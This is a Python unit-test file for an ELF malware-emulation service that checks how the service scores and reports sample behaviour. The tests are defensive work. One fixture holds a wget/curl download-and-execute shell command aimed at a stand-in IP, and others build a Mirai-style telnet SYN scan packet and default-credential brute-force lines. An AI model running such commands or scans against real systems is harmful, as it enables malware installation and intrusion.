import struct
import os
import re
from types import SimpleNamespace

import yaml
from assemblyline_v4_service.common.result import Result

from elfsim_service.emulator import emulate
from elfsim_service.elfsim_service import ElfSim, _is_local
from test.unit.elfbuilder import Prog

os.environ["SERVICE_MANIFEST_PATH"] = os.path.join(os.path.dirname(__file__), "..", "..", "service_manifest.yml")
MANIFEST_PATH = os.environ["SERVICE_MANIFEST_PATH"]


def _report(network=(), events=(), sent=(), files=None, file_modes=None):
    return SimpleNamespace(network=list(network), events=list(events), sent=list(sent),
                           files=files or {}, file_modes=file_modes or {}, error=None)


def _connect(ip, port, proto="tcp"):
    return {"op": "connect", "proto": proto, "family": "inet", "ip": ip, "port": port}


def _sections(fn, report, *extra):
    result = Result()
    fn(ElfSim(), result, report, *extra)
    return result.sections


def _score_of(section) -> int:
    return section.heuristic.score


# ---- manifest guards ------------------------------------------------------
def test_manifest_regexes_have_no_lookaround():
    # AL4's dispatcher is Rust: (?= (?! (?<= (?<! are unsupported and would break scheduling
    # for the whole instance.
    manifest = yaml.safe_load(open(MANIFEST_PATH))
    for field in ("accepts", "rejects"):
        assert not re.search(r"\(\?[=!<]", manifest[field]), f"{field} uses lookaround"


def test_every_heuristic_used_in_code_is_declared_in_the_manifest():
    manifest = yaml.safe_load(open(MANIFEST_PATH))
    declared = {h["heur_id"] for h in manifest["heuristics"]}
    src = open(os.path.join(os.path.dirname(__file__), "..", "..", "elfsim_service", "elfsim_service.py")).read()
    used = {int(n) for n in re.findall(r"(?:Heuristic|set_heuristic)\((\d+)", src)}
    assert used and used <= declared


def test_manifest_filetype_regexes_compile():
    for h in yaml.safe_load(open(MANIFEST_PATH))["heuristics"]:
        re.compile(h["filetype"])   # "*" would raise "nothing to repeat"


# ---- noise rules ----------------------------------------------------------
def test_loopback_and_private_connects_are_not_reported():
    report = _report(network=[_connect("127.0.0.1", 80), _connect("192.168.1.5", 22),
                              _connect("10.0.0.9", 443)])
    assert _sections(ElfSim._network, report) == []


def test_documentation_range_counts_as_remote():
    assert not _is_local("198.51.100.7")
    assert _is_local("127.0.0.1") and _is_local("192.168.0.1") and _is_local("169.254.1.1")


def test_single_tcp_connect_is_low_signal():
    (section,) = _sections(ElfSim._network, _report(network=[_connect("198.51.100.7", 4444)]))
    assert _score_of(section) == 100


def test_reconnect_loop_scores_higher_than_a_single_connect():
    report = _report(network=[_connect("198.51.100.7", 4444)] * 6)
    (section,) = _sections(ElfSim._network, report)
    assert _score_of(section) == 400  # tcp_connect 100 + persistent_reconnect 300


def test_udp_connect_to_port_53_without_a_query_is_not_scored():
    (section,) = _sections(ElfSim._network, _report(network=[_connect("203.0.113.9", 53, "udp")]))
    assert _score_of(section) == 0
    assert not section.tags


def test_daemonising_and_renaming_alone_score_nothing():
    events = [{"kind": "process", "syscall": "fork", "child_pid": 1001},
              {"kind": "process", "syscall": "setsid"},
              {"kind": "process", "syscall": "prctl", "new_name": "worker"}]
    (section,) = _sections(ElfSim._processes, _report(events=events), ["/tmp/sample"])
    assert _score_of(section) == 0


def test_writing_a_file_without_making_it_executable_scores_nothing(tmp_path, monkeypatch):
    class Req:
        def add_extracted(self, *a, **k): return True
    monkeypatch.setattr(ElfSim, "working_directory", property(lambda self: str(tmp_path)))
    svc = ElfSim()
    result = Result()
    svc._files(Req(), result, _report(files={"/tmp/x": b"data"}), ["/tmp/sample"])
    (section,) = result.sections
    assert _score_of(section) == 0


def test_dns_lookup_is_informational_but_tagged():
    report = _report(network=[{"op": "dns_query", "proto": "udp", "domain": "c2.test", "qtype": 1}])
    (section,) = _sections(ElfSim._dns, report)
    assert _score_of(section) == 0
    assert any(t == "c2.test" for tags in section.tags.values() for t in tags)


# ---- readable transcript of what was sent ----------------------------------
def _conv(messages, ip="198.51.100.7", port=4444, proto="tcp"):
    return {"proto": proto, "ip": ip, "port": port, "messages": messages,
            "total_bytes": sum(len(m) * n for m, n in messages)}


BOT_REGISTRATION = [[b"\x00\x00\x00\x01", 1], [b"\x04px86", 1], [b"\x03x86", 1], [b"\x00\x00", 95]]


def test_sent_data_is_a_readable_transcript_not_hex():
    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv(BOT_REGISTRATION)]))
    body = section.body
    assert "-> tcp://198.51.100.7:4444" in body
    assert "\\x00\\x00\\x00\\x01" in body and "\\x04px86" in body and "\\x03x86" in body
    assert "\\x00\\x00    x95" in body                      # repeats collapsed, not 95 rows
    assert 'readable text: "px86", "x86"' in body
    assert "000000" not in body.replace("\\x00", "")      # no hex dump anywhere
    assert _score_of(section) == 0


def test_identical_reconnects_are_reported_once_with_a_count():
    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv(BOT_REGISTRATION)] * 76))
    assert section.body.count("-> tcp://") == 1
    assert "identical in 76 connections" in section.body


def test_different_conversations_are_kept_separate():
    convs = [_conv(BOT_REGISTRATION), _conv([[b"GET / HTTP/1.1\r\n", 1]], ip="203.0.113.9", port=80)]
    (section,) = _sections(ElfSim._sent_data, _report(sent=convs))
    assert "tcp://198.51.100.7:4444" in section.body and "tcp://203.0.113.9:80" in section.body
    assert "GET / HTTP/1.1\\r\\n" in section.body


def test_netlink_and_addressless_sends_are_not_reported():
    convs = [_conv([[b"\x28\x00", 1]], ip=None, port=None, proto="netlink")]
    assert _sections(ElfSim._sent_data, _report(sent=convs)) == []


def test_tcp_sends_read_as_one_stream_but_udp_datagrams_stay_separate():
    tcp = _conv([[b"\x00\x00\x00\x01", 1], [b"\x04", 1], [b"px86", 1], [b"\x00\x00", 5]])
    (section,) = _sections(ElfSim._sent_data, _report(sent=[tcp]))
    assert "    \\x00\\x00\\x00\\x01\\x04px86\n" in section.body        # one stream line
    udp = _conv([[b"one", 1], [b"two", 1]], proto="udp", port=9999)
    (section,) = _sections(ElfSim._sent_data, _report(sent=[udp]))
    assert "    one\n    two" in section.body                                # datagrams kept apart


def test_a_session_cut_short_does_not_split_identical_conversations():
    full = _conv([[b"\x04px86", 1], [b"\x00\x00", 120]])
    short = _conv([[b"\x04px86", 1], [b"\x00\x00", 90]])
    (section,) = _sections(ElfSim._sent_data, _report(sent=[full] * 3 + [short]))
    assert section.body.count("-> tcp://") == 1
    assert "identical in 4 connections" in section.body and "x90-120" in section.body


# ---- unsupported files explain themselves quietly ---------------------------
def test_unsupported_file_gets_a_collapsed_explanation_with_no_heuristic():
    p = Prog()
    p.exit(0)
    blob = p.build(machine=20)   # EM_PPC

    class Req:
        file_contents = blob
        result = None

        def get_param(self, name):
            return {"arguments": "", "max_instructions": 1000,
                    "emulation_timeout_seconds": 5, "max_syscalls": 1000,
                    "allow_internet": False}[name]
    req = Req()
    ElfSim().execute(req)
    (section,) = req.result.sections
    assert "unsupported machine" in section.body and section.heuristic is None
    assert section.auto_collapse is True


def test_mips_sample_is_emulated_end_to_end_through_the_service():
    from test.unit.mipsbuilder import MipsProg

    class Req:
        result = None
        file_contents = None

        def __init__(self, data):
            self.file_contents = data
            self.supp = []

        def get_param(self, name):
            return {"arguments": "", "max_instructions": 1_000_000,
                    "emulation_timeout_seconds": 10, "max_syscalls": 10000,
                    "allow_internet": False}[name]

        def add_supplementary(self, *a, **k):
            self.supp.append(a[1])
            return True

    m = MipsProg()
    addr = m.d(MipsProg.sockaddr_in("198.51.100.7", 4444))
    m.call("socket", 2, 2, 0)
    m.fd_from_result()
    m.li(5, addr); m.li(6, 16)
    m.call_keep_args("connect")
    m.exit(0)
    req = Req(m.build())

    class Svc(ElfSim):
        working_directory = "/tmp"
    Svc().execute(req)
    titles = [s.title_text for s in req.result.sections]
    assert titles[0] == "Emulation summary" and any(t.startswith("Network connections") for t in titles)
    assert req.supp == ["elfsim_report.json"]


def test_manifest_accepts_elf32_and_elf64_only():
    accepts = yaml.safe_load(open(MANIFEST_PATH))["accepts"]
    for ok in ("executable/linux/elf32", "executable/linux/elf64"):
        assert re.fullmatch(accepts, ok)
    for no in ("executable/windows/pe64", "executable/linux/elf", "code/shell", "executable/linux/elf128"):
        assert not re.fullmatch(accepts, no)



# ---- shell commands become extracted scripts ---------------------------------------------
def _scripts(events, tmp_path, monkeypatch):
    monkeypatch.setattr(ElfSim, "working_directory", property(lambda self: str(tmp_path)))
    got = []

    class Req:
        def add_extracted(self, path, name, desc, **kw):
            got.append((name, open(path).read(), kw.get("parent_relation")))
            return True
    ElfSim()._scripts(Req(), SimpleNamespace(events=events))
    return got


def _exec(*argv):
    return {"kind": "process", "syscall": "execve", "path": argv[0], "argv": list(argv)}


def test_sh_dash_c_commands_are_extracted_as_scripts_for_bashsim_and_payloadfetcher(tmp_path, monkeypatch):
    cmd = "cd /tmp && (wget -q -O /tmp/.x 'http://198.51.100.7/a' || curl -ks -o /tmp/.x 'http://198.51.100.7/a') && chmod +x /tmp/.x && /tmp/.x &"
    (name, body, relation), = _scripts([_exec("/bin/sh", "-c", cmd), _exec("/bin/sh", "-c", cmd)], tmp_path, monkeypatch)
    assert name == "emulated_command_0.sh" and body == "#!/bin/sh\n" + cmd + "\n"     # deduplicated
    assert str(relation).endswith("DYNAMIC")


def test_non_shell_execs_and_plain_shell_starts_are_not_extracted(tmp_path, monkeypatch):
    events = [_exec("/usr/bin/wget", "-O", "x", "http://198.51.100.7/"), _exec("/bin/sh"), _exec("sh", "-c")]
    assert _scripts(events, tmp_path, monkeypatch) == []



# ---- output clean-up: colour codes and login-attempt noise --------------------------------
def test_ansi_colours_are_removed_and_plain_text_gets_no_readable_text_line():
    banner = b"\x1b[0m[\x1b[1;31mSnoopy.\x1b[0m][\x1b[1;31m0.0.0.0\x1b[0m] \x1b[1;31m>\x1b[0m [Unknown]\n"
    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv([[banner, 1]])] * 147))
    assert "\\x1b" not in section.body and "[Snoopy.][0.0.0.0] > [Unknown]" in section.body
    assert "readable text" not in section.body and "(identical in 147 connections)" in section.body
    assert "(colour codes removed)" in section.body


def test_a_telnet_login_brute_force_is_summarised_not_listed():
    attempts = ([[b"root\r\n", 27], [b"admin\r\n", 15], [b"support\r\n", 2], [b"guest\r\n", 1], [b"ubnt\r\n", 2]])
    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv(attempts, ip="203.0.113.9", port=23)]))
    lines = section.body.splitlines()
    assert "47 lines, 5 distinct" in section.body
    assert any(l.strip() == "root    x27" for l in lines) and len(lines) <= 8
    assert "readable text" not in section.body


def test_binary_protocols_still_get_readable_text_without_duplicates():
    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv([[b"\x00\x00\x00\x01\x04px86\x03x86\x04px86", 1]])]))
    assert section.body.count('"px86"') == 1


# ---- raw packets and DNS are decoded, not dumped ------------------------------------------
def _syn(dst: str, sport: int = 1668, dport: int = 23) -> bytes:
    """A hand-built IPv4/TCP SYN like a Mirai scanner sends: sequence number == destination."""
    d = bytes(int(o) for o in dst.split("."))
    ip = bytes([0x45, 0, 0, 40]) + b"\x9c\x9d\0\0" + bytes([64, 6]) + b"\0\0" + b"\0\0\0\0" + d
    tcp = struct.pack(">HH", sport, dport) + d + b"\0\0\0\0" + bytes([0x50, 0x02]) + struct.pack(">H", 0xA7D0) + b"\0\0\0\0"
    return ip + tcp


def _raw_conv(dst: str):
    return _conv([[_syn(dst), 1]], ip=dst, port=23, proto="raw")


def test_a_syn_scan_is_summarised_with_the_mirai_fingerprint_and_scores():
    convs = [_raw_conv(f"198.51.100.{i}") for i in range(1, 26)]
    result = Result()
    ElfSim()._scanning(result, convs)
    (section,) = result.sections
    assert "TCP SYN to port 23 (Telnet): 25 packets to 25 distinct hosts" in section.body
    assert "198.51.100.1, 198.51.100.2" in section.body and "(+17 more)" in section.body
    assert "ttl 64, 40 bytes each, window 0xa7d0, source port 1668" in section.body
    assert "Mirai scanner fingerprint" in section.body
    assert "\\x" not in section.body and section.heuristic.score == 300


def test_a_few_raw_packets_are_shown_but_not_scored_as_scanning():
    result = Result()
    ElfSim()._scanning(result, [_raw_conv(f"198.51.100.{i}") for i in range(1, 4)])
    (section,) = result.sections
    assert section.heuristic.score == 0 and "3 packets to 3 distinct hosts" in section.body


def test_raw_conversations_are_kept_out_of_the_sent_data_listing():
    sections = _sections(ElfSim._sent_data, _report(sent=[_raw_conv("198.51.100.7"), _conv([[b"hello", 1]])]))
    sent = next(s for s in sections if s.title_text.startswith("What the sample sent"))
    scan = next(s for s in sections if s.title_text.startswith("Raw packets"))
    assert "198.51.100.7" not in sent.body and "hello" in sent.body and "198.51.100.7" in scan.body


def test_dns_queries_are_rendered_as_text():
    query = (struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
             + b"\x02c2\x04test\x00" + struct.pack(">HH", 1, 1))
    conv = _conv([[query, 2]], ip="203.0.113.53", port=53, proto="udp")
    (section,) = _sections(ElfSim._sent_data, _report(sent=[conv]))
    assert "DNS query for c2.test (A)    x2" in section.body and "\\x" not in section.body
